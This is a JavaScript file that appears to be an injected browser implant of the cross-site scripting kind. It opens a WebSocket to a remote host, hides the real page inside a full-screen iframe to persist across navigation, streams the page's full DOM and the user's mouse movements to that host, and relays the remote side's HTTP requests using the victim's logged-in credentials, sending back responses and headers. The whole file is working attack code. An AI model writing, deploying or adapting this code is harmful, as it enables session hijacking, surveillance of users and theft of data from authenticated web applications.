let listening = "off";
let lastSent = 0;
let storedDOM;
const MAX_MESSAGES_PER_SECOND = 30;

function setListening(value, iframe) {
  listening = value;
  if(value === 'on'){
    const url = iframe.location.href;
    const message = JSON.stringify({ writeDom: { data: iframe.documentElement.outerHTML , baseURL: url } });
    ws.send(message);
  }
}

function getPersistence() {
  return new Promise((resolve) => {
    document.documentElement.innerHTML = '';
    const iframe = document.createElement('iframe');
    iframe.src = window.location.href;
    iframe.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;border:none;margin:0;padding:0;overflow:hidden;z-index:99999';
    document.documentElement.appendChild(iframe);
    iframe.onload = () => {
      resolve(iframe.contentDocument);
    }
    iframe.addEventListener('load', () => {
      attachHooks(iframe.contentDocument);
    });
  });
}

function attachHooks(iframe){

  if(listening === 'on'){
    const url = iframe.location.href;
    const message = JSON.stringify({ writeDom: { data: iframe.documentElement.outerHTML , baseURL: url } });
    ws.send(message);
  }

  iframe.addEventListener('mousemove', (event) => {
    if (listening === "on") {
      const mouseX = event.clientX;
      const mouseY = event.clientY;
      const now = Date.now();
      if (now - lastSent >= 1000 / MAX_MESSAGES_PER_SECOND) {
        lastSent = now;
        ws.send(JSON.stringify({
          setMouse: {
            mouseX, mouseY
          }
        }))
      }
    }
  });

  const observer = new MutationObserver((mutations) => {
    if (listening === "on") {
      const url = iframe.location.href;
      if (iframe.documentElement.outerHTML != storedDOM){
        storedDOM = iframe.documentElement.outerHTML;
        const message = JSON.stringify({ writeDom: { data: iframe.documentElement.outerHTML, baseURL: url } });
        ws.send(message);
      }
    }
  });

  observer.observe(iframe.documentElement, {
    childList: true,
    subtree: true,
    attributes: false,
    characterData: true,
  });
}

function checkSameOrigin(url) {
  const locationOrigin = new URL(window.location.href);
  const urlOrigin = new URL(url);

  if (locationOrigin.protocol !== urlOrigin.protocol || locationOrigin.hostname !== urlOrigin.hostname || locationOrigin.port !== urlOrigin.port) {
    return false;
  }

  const locationDomainParts = locationOrigin.hostname.split('.').reverse();
  const urlDomainParts = urlOrigin.hostname.split('.').reverse();

  for (let i = 0; i < Math.min(locationDomainParts.length, urlDomainParts.length); i++) {
    if (locationDomainParts[i] !== urlDomainParts[i]) {
      return false;
    }
  }

  return true;
}

async function checkCorsHeaders(url, headers) {
  try {
    const response = await fetch(url, {
      method: 'OPTIONS',
      mode: 'cors',
      headers: {
        'Access-Control-Request-Method': 'GET',
        'Access-Control-Request-Headers': headers.join(','),
      },
    });

    if (response.ok) {
      const allowedOrigin = response.headers.get('Access-Control-Allow-Origin');
      const allowedHeaders = response.headers.get('Access-Control-Allow-Headers');
      return {
        allowedOrigin: allowedOrigin === window.location.origin,
        allowedHeaders: allowedHeaders ? allowedHeaders.split(',').map((header) => header.trim().toLowerCase()) : [],
      };
    }
  } catch (error) {
    console.error('Error sending preflight request:', error);
  }

  return { allowedOrigin: false, allowedHeaders: [] };
}

async function sendHttpRequest(data, ws) {
  const sameOrigin = checkSameOrigin(data.url);
  let allowedOrigin = false;
  let allowedHeaders = [];

  if (!sameOrigin) {
    const corsHeaders = await checkCorsHeaders(data.url, Object.keys(data.headers || {}));
    allowedOrigin = corsHeaders.allowedOrigin;
    allowedHeaders = corsHeaders.allowedHeaders;
  }

  if (sameOrigin || allowedOrigin) {
    const xhr = new XMLHttpRequest();
    xhr.onreadystatechange = () => {
      if (xhr.readyState === XMLHttpRequest.DONE) {
        let responseData;
        responseData = xhr.responseText;
        const responseHeaders = {};
        xhr.getAllResponseHeaders().split('\r\n').forEach((header) => {
          const [key, value] = header.split(': ');
          if (key) {
            responseHeaders[key] = value;
          }
        });
        ws.send(JSON.stringify({
          requestId: data.requestId,
          data: responseData,
          headers: responseHeaders,
          status_code: xhr.status,
        }));
      }
    };
    xhr.onerror = () => {
      ws.send(JSON.stringify({ error: 'Invalid Security Context', statusCode: 0 , requestId: data.requestId}));
    };
    xhr.open(data.method, data.url);
    xhr.withCredentials = true;

    if (!sameOrigin) {
      Object.entries(data.headers || {}).forEach(([header, value]) => {
        if (allowedHeaders.includes(header.toLowerCase())) {
          xhr.setRequestHeader(header, value);
        }
      });
    } else{
      Object.entries(data.headers || {}).forEach(([header, value]) => {
        xhr.setRequestHeader(header, value);
      });
    }
    if (data.method === 'POST' || data.method === 'PUT') {
      xhr.send(data.data);
    } else {
      xhr.send();
    }
  } else {
    ws.send(JSON.stringify({ error: 'Invalid Security Context', statusCode: 0, requestId: data.requestId }));
  }
}

let ws = null;

if (window.parent === window) {
  ws = new WebSocket('ws://' + ip + ':' + serverPort );

  getPersistence().then((iframe) => {
    ws.onmessage = (event) => {
      const message = JSON.parse(event.data);
      if (message.sendRequest) {
        sendHttpRequest(message.sendRequest, ws);
      } else if (message.listening) {
        setListening(message.listening, iframe);
      }
    };
  });
}